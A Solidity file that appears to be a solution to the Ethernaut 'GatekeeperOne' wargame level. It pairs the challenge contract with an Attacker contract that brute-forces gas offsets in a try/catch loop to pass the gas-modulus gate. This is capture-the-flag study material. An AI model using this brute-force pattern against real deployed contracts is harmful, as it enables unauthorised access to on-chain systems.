// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;

import "forge-std/console.sol";

contract GatekeeperOne {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft() % 8191 == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract Attacker {
    function attack(bytes8 key, address _gate) public{
        GatekeeperOne gate = GatekeeperOne(_gate);
        for (uint i = 0; i <= 8191; i++) {
            try gate.enter{gas: (800000 + i)}(key){
                console.log("in it!", i);
            } catch {}
        }
    }
}